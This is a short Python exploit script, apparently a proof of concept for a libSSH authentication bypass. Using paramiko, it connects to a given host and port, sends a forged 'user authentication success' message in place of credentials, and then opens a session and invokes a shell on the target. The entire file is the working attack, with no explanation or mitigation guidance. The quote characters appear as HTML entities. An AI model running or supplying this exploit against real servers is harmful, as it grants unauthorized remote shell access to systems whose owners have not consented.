import paramiko
import socket
import argparse
from sys import argv, exit
 
 
parser = argparse.ArgumentParser(description="libSSH Authentication Bypass")
parser.add_argument(&#039;--host&#039;, help=&#039;Host&#039;)
parser.add_argument(&#039;-p&#039;, &#039;--port&#039;, help=&#039;libSSH port&#039;, default=22)
parser.add_argument(&#039;-log&#039;, &#039;--logfile&#039;, help=&#039;Logfile to write conn logs&#039;, default="paramiko.log")
 
args = parser.parse_args()
 
 
def BypasslibSSHwithoutcredentials(hostname, port):
     
    sock = socket.socket()
    try:
        sock.connect((str(hostname), int(port)))
 
        message = paramiko.message.Message()
        transport = paramiko.transport.Transport(sock)
        transport.start_client()
   
        message.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
        transport._send_message(message)
     
        spawncmd = transport.open_session()
        spawncmd.invoke_shell()
        return 0
     
    except paramiko.SSHException as e:
        print("TCPForwarding disabled on remote/local server can&#039;t connect. Not Vulnerable")
        return 1
    except socket.error:
        print("Unable to connect.")
        return 1
 
 
def main():
    paramiko.util.log_to_file(args.logfile)
    try:
        hostname = args.host
        port = args.port
    except:
        parser.print_help()
        exit(1)
    BypasslibSSHwithoutcredentials(hostname, port)
 
if __name__ == &#039;__main__&#039;:
    exit(main())

